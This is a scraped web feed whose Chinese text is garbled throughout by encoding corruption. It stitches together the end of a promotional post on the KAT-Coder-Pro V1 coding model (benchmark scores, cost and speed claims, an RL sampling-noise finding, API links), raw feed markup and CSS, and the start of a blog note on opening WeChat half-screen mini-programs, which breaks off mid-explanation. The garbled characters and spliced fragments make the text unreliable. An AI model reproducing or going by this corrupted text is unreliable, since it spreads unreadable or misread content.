<p>éšç€æˆ‘ä»¬è¿›ä¸€æ­¥æå‡æ¨¡å‹çš„é€šç”¨ä»»åŠ¡èƒ½åŠ›ï¼ŒKAT-Coder-Pro V1 åœ¨ Artificial Analysisï¼ˆAAï¼‰æƒå¨è¯„æµ‹ä¸­å±•ç°å‡ºå…¨é¢ä¸”å¼ºåŠ²çš„æ€§èƒ½æå‡ï¼Œæ ¸å¿ƒæŒ‡æ ‡è¡¨ç°å¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c35bdbbcf6240b8b76c16a6e7b9c03e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=j2K49up7AAXNazjONHXiGKVSSfk%3D" alt="" loading="lazy"/></p>
<ul>
<li>
<p><strong>ç»¼åˆæ’åè·»èº«å…¨çƒ TOP 10</strong>ï¼šArtificial Analysis intelligence index å–å¾— 64 åˆ†ï¼Œç»¼åˆæ¨¡å‹èƒ½åŠ›æ’åç¬¬ååï¼Œè¶…è¶Š Claude 4.5 Sonnetï¼Œæˆä¸ºæ¦œå•ä¸­è¡¨ç°æœ€çªå‡ºçš„å›½äº§ç¼–ç æ¨¡å‹ä¹‹ä¸€ï¼›åœ¨ Non-Reasoning Model èµ›é“ä¸­ï¼Œæ›´æ˜¯ä»¥ç»å¯¹ä¼˜åŠ¿æ‹¿ä¸‹æ¦œå•ç¬¬ä¸€ã€‚</p>
</li>
<li>
<p><strong>å·¥å…·è°ƒç”¨èƒ½åŠ›é¢†å…ˆ</strong>ï¼šåœ¨ğœÂ²-Bench Telecomï¼ˆAgentic Tool Useï¼‰ä¸­å–å¾— 89% çš„ä¼˜å¼‚æˆç»©ï¼Œå……åˆ†éªŒè¯å…¶åœ¨å¤æ‚å·¥å…·è°ƒç”¨åœºæ™¯ä¸‹çš„é«˜æ•ˆæ€§ä¸å¯é æ€§ã€‚</p>
</li>
<li>
<p><strong>é€šç”¨ä»»åŠ¡èƒ½åŠ›æå‡</strong>ï¼šåœ¨å„ç±»é«˜éš¾åº¦å­¦ç§‘æ¨ç†åŸºå‡†æµ‹è¯•ä¸­è¡¨ç°æ˜¾è‘—æå‡ï¼Œè¿›ä¸€æ­¥è´´è¿‘å®é™…å¼€å‘éœ€æ±‚ï¼ŒAA-LCRï¼ˆLong Context Reasoningï¼‰è¾¾åˆ° 74%ï¼›Humanity's Last Exam è¾¾åˆ° 33.4%ï¼›AIME 2025 è¾¾åˆ° 95%ã€‚</p>
</li>
<li>
<p><strong>æŒ‡ä»¤éµå¾ªèƒ½åŠ›çªå‡º</strong>ï¼šIFBenchï¼ˆInstruction Followingï¼‰æŒ‡æ ‡è¾¾ 68%ï¼Œè¶…è¿‡ Claude Opus 4.5ã€Deepseek V3.2 ç­‰æ¨¡å‹ï¼Œèƒ½æ›´ç²¾å‡†ç†è§£å¼€å‘è€…æ„å›¾ï¼Œå‡å°‘å› æŒ‡ä»¤åå·®å¯¼è‡´çš„æ— æ•ˆè¾“å‡ºï¼Œæå‡å¼€å‘æ•ˆç‡ã€‚</p>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/287073d794d541d0a18d01c47386bdb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=%2BmimrOrUtrauGz4Vdm86dWzLTS8%3D" alt="" loading="lazy"/></p>
<p>åœ¨ AA æ¦œå•çš„å®˜æ–¹è¯„æµ‹ç»“æœä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ¸…æ™°çœ‹åˆ°äº† KAT-Coder-Pro V1 é™¤æ€§èƒ½å¤–çš„å…¶ä»–ä¼˜ç‚¹ã€‚</p>
<ul>
<li><strong>æè‡´æ€§ä»·æ¯”</strong></li>
</ul>
<p>åœ¨ AA è¯„æµ‹ä»»åŠ¡ä¸­ï¼ŒKAT-Coder-Pro V1 çš„è¾“å‡º Token æ¶ˆè€—é‡è¿œä½äºåŒæ€§èƒ½åŒºé—´çš„å…¶ä»–æ¨¡å‹ï¼ˆå¦‚ Claude 4.5 Sonnetã€Grok 4.1 Fastï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œæ­é… KAT-Coder-Pro V1 æå…·ç«äº‰åŠ›çš„å®šä»·ï¼Œåœ¨çœŸå®ä¸–ç•Œçš„ç›¸åŒç¼–ç¨‹ä»»åŠ¡ä¸­ï¼ŒKAT-Coder-Pro V1 èƒ½è®©ç”¨æˆ·ä»¥æ›´ä½æˆæœ¬è·å¾—ç¨³å®šä¸”é«˜è´¨é‡çš„è¾“å‡ºï¼Œæ›´å¥½çš„å®ç°äº†ä»·æ ¼ä¸è´¨é‡çš„å¹³è¡¡ï¼Œæ— ç–‘æ˜¯ AI ç¼–ç¨‹åœºæ™¯ä¸‹æå…·ç«äº‰åŠ›çš„é«˜æ€§ä»·æ¯”ä¹‹é€‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d965feb5cdc4fc7b9cf8c42dc56b406~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=%2FGokwyyncIabUU0AgzzY6CCMxTI%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>æé€Ÿå“åº”ï¼Œä¿éšœæ²‰æµ¸å¼ç¼–ç ä½“éªŒ</strong></li>
</ul>
<p>KAT-Coder-Pro V1 å…¼å…·å“è¶Šçš„æœåŠ¡æ€§èƒ½ï¼Œç«¯åˆ°ç«¯å“åº”è€—æ—¶ä¹Ÿè¿œä¼˜äºåŒæ€§èƒ½åŒºé—´çš„å…¶ä»–æ¨¡å‹ã€‚åœ¨çœŸå®å¼€å‘åœºæ™¯ä¸­ï¼Œå“åº”æ…¢çš„æ¨¡å‹ï¼Œå¾ˆå®¹æ˜“è®©å¼€å‘è€…é™·å…¥ â€œç­‰å¾…ç„¦è™‘â€ï¼ŒåŠåœ¨ Vibe coding è¿‡ç¨‹ä¸­ï¼Œéœ€è¦åœä¸‹æ¥ç­‰å¾…æ¨¡å‹åŠ è½½è¾“å‡ºï¼Œçªç„¶å†’å‡ºæ¥çš„æ€è·¯çµæ„Ÿå®¹æ˜“åœ¨ç­‰å¾…è¾“å‡ºçš„è¿‡ç¨‹ä¸­è¢«æ‰“æ–­è·‘åã€‚KAT-Coder-Pro V1 å¯ä»¥åš â€œå³è¾“å³å¾—â€ï¼Œè®©å¼€å‘è€…åœ¨æ²‰æµ¸å¼å¼€å‘ä¸­å½»åº•å‘Šåˆ«ç­‰å¾…ï¼Œå°½äº«è¡Œäº‘æµæ°´èˆ¬çš„ç¼–ç ä½“éªŒã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9f0d3d50c5f4e5c80c857c4af7dd2ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=jT8de0CD7SRj1XFr2hHl7ONiZiE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">æŠ€æœ¯æ­ç§˜ï¼šå¦‚ä½•è§£å†³ MOE æ¨¡å‹ RL è®­ç»ƒçš„ä¸ç¨³å®šæ€§ï¼Ÿ</h3>
<p>å½“å‰ä¸šç•Œå¤§å¤šæŠŠæ¨¡å‹åœ¨ RL è®­ç»ƒæ—¶å‡ºç° reward å´©æºƒçš„é—®é¢˜å½’å› äºâ€œè®­æ¨ä¸ä¸€è‡´â€ã€‚ç„¶è€Œï¼Œ<strong>æˆ‘ä»¬çš„å®éªŒå‘ç°ï¼šå½“å‰é˜¶æ®µ RL è®­ç»ƒä¸ç¨³å®šçš„ä¸»å¯¼å› ç´ å¹¶ä¸æ˜¯è®­æ¨ä¸ä¸€è‡´ï¼Œè€Œæ˜¯é‡‡æ ·å™ªå£°ï¼ˆSampling Noiseï¼‰æœ¬èº«</strong>ã€‚å½“æˆ‘ä»¬æ˜¾å¼æŠ‘åˆ¶å™ªå£°å¼ºåº¦åï¼Œå³ä½¿å­˜åœ¨æ˜æ˜¾çš„è®­æ¨å·®å¼‚ï¼Œè®­ç»ƒä¾æ—§ä¿æŒç¨³å®šï¼Œå¹¶èƒ½è·å¾—æ›´å¿«çš„æ”¶æ•›é€Ÿåº¦ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a772b9e5746841ac9a071a647f8b7fb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=S5dEhAyf3vrSpgDyanyZOo9bxEU%3D" alt="" loading="lazy"/></p>
<p>å›¾ä¸­ mean_8(é»„çº¿)ä»£è¡¨æˆ‘ä»¬æå‡ºçš„æŠ‘åˆ¶é‡‡æ ·å™ªå£°æ–¹æ³•ï¼Œå…¶ä½™æ›²çº¿ä¸º TIS ç­‰ä¸šç•Œå¸¸ç”¨æ–¹æ³•ã€‚å¯¹æ¯”å¯è§ï¼Œæˆ‘ä»¬çš„æ–¹æ³•èƒ½è·å¾—æ›´å¥½çš„è®­ç»ƒæ•ˆæœã€‚</p>
<p><strong>å…·ä½“æŠ€æœ¯ç»†èŠ‚è¯¦è§ï¼š</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Flink%3Ftarget%3Dhttps%253A%252F%252Fkwaikat.github.io%252Fkwaikat-blog%252Fposts%252Fkatcoder_1201%252F" target="_blank" title="https://xie.infoq.cn/link?target=https%3A%2F%2Fkwaikat.github.io%2Fkwaikat-blog%2Fposts%2Fkatcoder_1201%2F" ref="nofollow noopener noreferrer">kwaikat.github.io/kwaikat-bloâ€¦</a></p>
<h3 data-id="heading-3">ä¾¿æ·æ¥å…¥ï¼Œé™æ—¶å…è´¹ä½“éªŒé¡¶å°– AI ç¼–ç èƒ½åŠ›</h3>
<p>ç›®å‰ï¼ŒStreamLake å®˜æ–¹ API å·²åŒæ­¥æ›´æ–°ï¼Œæ¥å£ä¸è°ƒç”¨æ–¹å¼ä¿æŒä¸å˜ã€‚ä¸”ä¸ OpenRouterã€Novita AIã€AtlasCloudã€ZenMux ç­‰åˆä½œä¼™ä¼´å®Œæˆå…¼å®¹é€‚é…ï¼Œå¼€å‘è€…æ— éœ€é‡æ–°é…ç½®å³å¯ç»§ç»­å…è´¹ä½“éªŒæœ€æ–°æ¨¡å‹ã€‚</p>
<p><strong>å¼€å‘å·¥å…·æ¥å…¥æŒ‡å—</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Flink%3Ftarget%3Dhttps%253A%252F%252Fwww.streamlake.com%252Fdocument%252FWANQING%252Fme6ymdjrqv8lp4iq0o9" target="_blank" title="https://xie.infoq.cn/link?target=https%3A%2F%2Fwww.streamlake.com%2Fdocument%2FWANQING%2Fme6ymdjrqv8lp4iq0o9" ref="nofollow noopener noreferrer">www.streamlake.com/document/WAâ€¦</a></p>
<p><strong>API KEY ç”³è¯·</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Flink%3Ftarget%3Dhttps%253A%252F%252Fstreamlake.com%252Fproduct%252Fkat-coder" target="_blank" title="https://xie.infoq.cn/link?target=https%3A%2F%2Fstreamlake.com%2Fproduct%2Fkat-coder" ref="nofollow noopener noreferrer">streamlake.com/product/katâ€¦</a></p>
<p>æœŸå¾…ä¸æ‚¨æºæ‰‹ï¼Œå…±åŒåˆ›é€ æ–°çš„æœªæ¥ã€‚</p>
<p>æ‰«ç å³å¯è¿›å…¥ã€ŒKwaiKAT äº¤æµç¾¤ã€è·å–æœ€æ–°èµ„è®¯ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f79a638b5fe4dfd8c8706ee875366e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b-r5omL5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458838&amp;x-signature=H%2FAVjl3N9WqORVeqqB2s5bVuQMQ%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®°å½•æ›¾ç»æ‰“å¼€åŠå±å°ç¨‹åºé‡åˆ°çš„äº‹]]></title>    <link>https://juejin.cn/post/7583971282891882548</link>    <guid>https://juejin.cn/post/7583971282891882548</guid>    <pubDate>2025-12-16T02:33:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583971282891882548" data-draft-id="7582529173828141090" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®°å½•æ›¾ç»æ‰“å¼€åŠå±å°ç¨‹åºé‡åˆ°çš„äº‹"/> <meta itemprop="keywords" content="å‰ç«¯,å¾®ä¿¡å°ç¨‹åº"/> <meta itemprop="datePublished" content="2025-12-16T02:33:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wangpq"/> <meta itemprop="url" content="https://juejin.cn/user/2172290705137415"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®°å½•æ›¾ç»æ‰“å¼€åŠå±å°ç¨‹åºé‡åˆ°çš„äº‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2172290705137415/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wangpq
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T02:33:40.000Z" title="Tue Dec 16 2025 02:33:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»Šå¹´8æœˆå¼€å‘æ–°ç–†é¡¹ç›®æ—¶ï¼Œæ›¾æ¥åˆ°ä¸ªéœ€æ±‚ï¼Œéœ€è¦æˆ‘ä»¬è¿™è¾¹é…åˆç¬¬ä¸‰æ–¹çš„å°ç¨‹åºï¼ˆç«‹å…‹åŠï¼‰åŠå±æ‰“å¼€æˆ‘ä»¬çš„æ–°ç–†ä¸€ç æ¸¸å°ç¨‹åºï¼Œå¹¶ä¸”éœ€è¦åšå•ç‚¹ç™»å½•ï¼Œä»ç«‹å…‹åŠé‚£è¾¹ç›´æ¥æ— æ„Ÿç™»å½•æˆ‘ä»¬å°ç¨‹åºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b9cb609343f4d2b8bec25e4e4705ca0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3Bx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457220&amp;x-signature=3KqYnWB%2BRltQCYOT7VhGoCW0K7k%3D" alt="53a3eb48-2bf3-4a4e-b000-8b04b21eea40.png" loading="lazy"/></p>
<p>åˆšå¼€å§‹è§‰å¾—æ²¡å¤šå°‘äº‹ï¼Œäº‹ååšä¸‹æ¥ï¼Œè¿˜æ˜¯å‡ºäº†ä¸€äº›é—®é¢˜ã€‚ä¸»è¦åŸå› è¿˜æ˜¯å› ä¸ºæ¶‰åŠç¬¬ä¸‰æ–¹ï¼Œäº‹å…ˆç¼ºå°‘æ²Ÿé€šï¼Œæœ‰äº›ä¸œè¥¿æƒ³å½“ç„¶äº†ã€‚å½“æ—¶å¬äº§å“æè¿°éœ€æ±‚ï¼Œä»¥ä¸ºç¬¬ä¸‰æ–¹ï¼ˆç«‹å…‹åŠï¼‰é‚£è¾¹åŠå±æ‰“å¼€æˆ‘ä»¬çš„æ–°ç–†ä¸€ç æ¸¸å°ç¨‹åºï¼Œæ‰€æœ‰å‚æ•°éƒ½åœ¨<code>wx.navigateToMiniProgram</code>æ–¹æ³•çš„<code>path</code>å‚æ•°é‡Œé¢ï¼ˆå®é™…ä»–ä»¬ä¸€éƒ¨åˆ†å‚æ•°åœ¨<code>path</code>ä¸­ï¼Œå¦ä¸€éƒ¨åˆ†åœ¨<code>extraData</code>ä¸­ï¼‰ã€‚ç»“æœåšå®Œä¸Šçº¿ç”Ÿäº§ï¼ˆç¬¬ä¸‰æ–¹æ²¡æœ‰æä¾›å¼€å‘ç‰ˆå’Œä½“éªŒç‰ˆï¼Œåªæœ‰ç”Ÿäº§ç‰ˆæœ¬ï¼‰ï¼Œæ‰å‘ç°é—®é¢˜ï¼Œç»è¿‡å’Œç¬¬ä¸‰æ–¹å¤šç•ªçº¿ä¸Šè¯­è¨€æ²Ÿé€šï¼Œæ‰ææ¸…æ¥šé—®é¢˜æ‰€åœ¨ï¼Œæ²Ÿé€šè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸‰æ–¹å› ä¸ºä¸€äº›ç†ç”±æ‹’ç»ä¿®æ”¹ä¼ å‚æ–¹å¼ï¼Œæ‰€ä»¥æˆ‘è¿™è¾¹åˆåªå¥½é…åˆä¿®æ”¹äº†æ¥æ”¶å‚æ•°æ–¹å¼ã€‚æœ€ç»ˆæ‰çº¿ä¸Šæµ‹è¯•æå®šã€‚</p>
<p>å•°å—¦äº†åŠå¤©ï¼Œè¿˜æ²¡è®²åˆ°æ­£é¢˜ï¼Œä»Šå¤©åœ¨è¿™é‡Œï¼Œæˆ‘ä¸»è¦æ˜¯æƒ³è®°å½•ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼Œæ–¹ä¾¿ä»¥åæŸ¥é˜…ï¼Œéƒ½è¯´å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´å˜›ï¼Œä¸‹é¢å¼€å§‹è®°å½•ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…³äºæ‰“å¼€åŠå±å°ç¨‹åº</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fframework%2Fopen-ability%2FopenEmbeddedMiniProgram.html" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/framework/open-ability/openEmbeddedMiniProgram.html" ref="nofollow noopener noreferrer">æ‰“å¼€åŠå±å°ç¨‹åº</a>ï¼Œæˆ‘ä»¬å¯ä»¥ä»å¾®ä¿¡å®˜æ–¹æ–‡æ¡£ä¸­çŸ¥é“ï¼Œä½¿ç”¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.weixin.qq.com%2Fminiprogram%2Fdev%2Fapi%2Fnavigate%2Fwx.openEmbeddedMiniProgram.html" target="_blank" title="https://developers.weixin.qq.com/miniprogram/dev/api/navigate/wx.openEmbeddedMiniProgram.html" ref="nofollow noopener noreferrer">wx.openEmbeddedMiniProgram</a> å³å¯ï¼Œä¸‹é¢ä»‹ç»ä¸‹å®ƒçš„å‡ ä¸ªé‡è¦å‚æ•°ã€‚</p>
<h3 data-id="heading-1">1ã€envVersion</h3>
<p><code>envVersion</code>è¡¨ç¤ºè¦æ‰“å¼€çš„å°ç¨‹åºç‰ˆæœ¬ï¼ŒåŒ…å«developã€trialã€release,ä»æ–‡æ¡£</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa63b09a559b473688009a1cc9a0a1e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd2FuZ3Bx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766457220&amp;x-signature=x%2F0Xw1YC7UuSyileyV%2FXqjEj8Hs%3D" alt="a5dbe248-974c-4210-aaea-a4ce93400199.png" loading="lazy"/>
ä¸­æˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ï¼Œå¦‚æœä¸»åŠ¨æ‰“å¼€æ–¹çš„å°ç¨‹åºæœªè®¾ç½®<code>envVersion</code>,æˆ–è€…è®¾ç½®ä¸ºæ­£å¼ç‰ˆ<code>release</code>ï¼Œé‚£ä¹ˆè¢«æ‰“å¼€æ–¹çš„å°ç¨‹åºä¹Ÿå¿…é¡»æ˜¯æ­£å¼ç‰ˆã€‚é€šä¿—è®²å°±æ˜¯ï¼Œæˆ‘å¼€å‘ï¼Œä½ ä¹Ÿå¼€å‘ï¼Œæˆ‘ä½“éªŒï¼Œä½ ä¹Ÿä½“éªŒï¼Œæˆ‘æ­£å¼ï¼Œä½ ä¹Ÿæ­£å¼ã€‚</p>
<p>å¦‚æœåŒæ–¹è¿˜åœ¨å¼€å‘è°ƒè¯•é˜¶æ®µï¼Œæœ€å¥½è¿˜æ˜¯è®¾ç½®ä¸ºä½“éªŒç‰ˆ<code>trial</code>æ¯”è¾ƒå¥½ï¼ŒåŒæ–¹éƒ½æ˜¯ä½“éªŒç‰ˆç‰ˆï¼Œæ–¹ä¾¿å¼€å‘è°ƒè¯•ï¼Œç­‰å¼€å‘æµ‹è¯•æ²¡å•¥é—®é¢˜äº†ï¼Œå†æ”¹ä¸º<code>release</code>æˆ–è€…å»æ‰<code>envVersion</code>å‚æ•°ï¼Œä»¥é¿å…åœ¨æ­£å¼ç‰ˆå‘ç°é”™è¯¯ï¼Œç›²æ”¹åå†çº¿ä¸Šæµ‹è¯•ã€‚</p>
<p>æˆ‘ä»¬å½“æ—¶å°±æ˜¯åœ¨æ­£å¼ç‰ˆï¼Œæˆ‘è¿™é‡Œåªèƒ½ç›²æ”¹å¼€å‘ï¼Œæ˜“å‡ºé”™ï¼Œæ•ˆç‡ä½ã€‚</p>
<h3 data-id="heading-2">2ã€appIdã€pathã€extraData</h3>
<p><code>appId</code>ä¸ºè¦æ‰“å¼€çš„å°ç¨‹åº appIdï¼Œæ— éœ€å¤šè¨€ã€‚<code>path</code>ä¸ºè¦æ‰“å¼€çš„é¡µé¢è·¯å¾„ï¼Œå€¼ä¸ºå­—ç¬¦ä¸²<code>string</code>ç±»å‹ï¼Œ<code>extraData</code>ä¸ºéœ€è¦ä¼ é€’ç»™ç›®æ ‡å°ç¨‹åºçš„æ•°æ®ï¼Œå€¼ä¸ºå¯¹è±¡<code>object</code>ç±»å‹ã€‚è¿™é‡Œçš„<code>path</code>ä¸ä»…ä»…å¯ä»¥è®¾ç½®è¦æ‰“å¼€çš„å°ç¨‹åºé¡µé¢è·¯å¾„ï¼Œè¿˜èƒ½ä¼ é€’å‚æ•°ï¼Œpath ä¸­ ? åé¢çš„éƒ¨åˆ†ä¼šæˆä¸º queryã€‚</p>
<p>è™½ç„¶<code>path</code>ã€<code>extraData</code>ä¸¤è€…éƒ½å¯ä»¥ä¼ é€’å‚æ•°ï¼Œä¸è¿‡å¤§å®¶éœ€è¦æ³¨æ„ä¸¤è€…è·å–å‚æ•°çš„åŒºåˆ«ã€‚</p>
